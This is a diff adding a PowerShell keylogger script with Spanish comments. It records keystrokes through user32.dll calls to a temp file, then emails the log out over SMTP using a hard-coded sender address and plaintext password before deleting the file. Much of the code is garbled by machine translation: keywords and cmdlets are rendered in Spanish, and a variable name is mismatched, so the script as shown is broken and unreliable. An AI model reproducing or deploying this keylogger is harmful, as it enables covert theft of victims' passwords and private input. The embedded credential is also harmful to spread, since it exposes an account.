@@ -1,0 +1,93 @@
+# ¡ Edita solo esta sección!
+$ TimesToRun  =  2
+$ RunTimeP  =  1
+$ From  =  " 981975751tata@gmail.com "
+$ Pass  =  " 981975751 "
+$ To  =  " USER2@mail.com "
+$ Subject  =  " Resultados de Keylogger "
+$ body  =  " Resultados de Keylogger "
+$ SMTPServer  =  " smtp.mail.com "
+$ SMTPPort  =  " 587 "
+$ credentials  =  new-object Management.Automation.PSCredential $ From , ( $ Pass  |  ConvertTo-SecureString  - AsPlainText - Force)
+# ###########################
+
+
+$ TimeStart  =  Get-Date
+$ TimeEnd  =  $ timeStart .addminutes ( $ RunTimeP )
+
+# requiere -Versión  2
+function  Start-KeyLogger ( $ Path = " $ env: temp \ keylogger.txt " )
+{
+  # Firmas para llamadas a la API
+  $ firmas  =  @ '
+[DllImport ("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)] 
+public static extern short GetAsyncKeyState (int virtualKeyCode); 
+[DllImport ("user32.dll", CharSet = CharSet.Auto)]
+public static extern int GetKeyboardState (byte [] keystate);
+[DllImport ("user32.dll", CharSet = CharSet.Auto)]
+public static extern int MapVirtualKey (uint uCode, int uMapType);
+[DllImport ("user32.dll", CharSet = CharSet.Auto)]
+public static extern int ToUnicode (uint wVirtKey, uint wScanCode, byte [] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  # cargar firmas y hacer que los miembros estén disponibles
+  $ API  =  Add-Type  - MemberDefinition $ signatures  - Nombre ' Win32 '  - API de espacio de nombres - PassThru
+    
+  # crear archivo de salida
+  $ null  =  Nuevo elemento  - Ruta $ Ruta  - Archivo de tipo de artículo - Forzar
+
+  tratar
+  {
+
+    # crear bucle sin fin. Cuando el usuario presiona CTRL + C, finalmente se bloquea.
+    # ejecuta y muestra las pulsaciones de teclas recogidas
+    $ Runner  =  0
+	while ( $ TimesToRun   -ge  $ Runner ) {
+	while ( $ TimeEnd  -ge  $ TimeNow ) {
+      Inicio-sueño  - Milisegundos 40
+      
+      # escanear todos los códigos ASCII arriba 8
+      para ( $ ascii  =  9 ; $ ascii  -le  254 ; $ ascii ++ ) {
+        # obtener estado clave actual
+        $ state  =  $ API :: GetAsyncKeyState ( $ ascii )
+
+        # se presiona la tecla?
+        if ( $ state  -eq  -32767 ) {
+          $ null  = [ consola ] :: CapsLock
+
+          # traducir código de escaneo a código real
+          $ virtualKey  =  $ API :: MapVirtualKey ( $ ascii ,  3 )
+
+          # obtener el estado del teclado para las teclas virtuales
+          $ kbstate  =  Byte de objeto nuevo [] 256
+          $ checkkbstate  =  $ API :: GetKeyboardState ( $ kbstate )
+
+          # preparar un StringBuilder para recibir la clave de entrada
+          $ mychar  =  Objeto nuevo  - TypeName System.Text.StringBuilder
+
+          # traducir clave virtual
+          $ success  =  $ API :: ToUnicode ( $ ascii ,  $ virtualKey ,  $ kbstate ,  $ mychar ,  $ mychar .Capacidad ,  0 )
+
+          si ( $ exito )
+          {
+            # agregar clave al archivo logger
+            [ System.IO.File ] :: AppendAllText ( $ Path ,  $ mychar , [ System.Text.Encoding ] :: Unicode)
+          }
+        }
+      }
+	  $ TimeNow  =  Get-Date
+    }
+	send-MailMessage  - desde $ de  - a $ a  - sujeto $ Asunto  - cuerpo $ cuerpo  - Accesorio $ Path  - smtpServer $ smtpServer  - puerto $ smtpPort  - credencial credenciales $  - usessl
+	Quitar elemento  - Ruta $ Ruta  - fuerza
+	}
+  }
+  finalmente
+  {
+    # abrir el archivo logger en el Bloc de notas
+	salida  1
+  }
+}
+
+# registra todas las pulsaciones de teclas hasta que se anula el script presionando CTRL + C
+# entonces abrirá el archivo con los códigos clave recogidos
+Iniciar KeyLogger
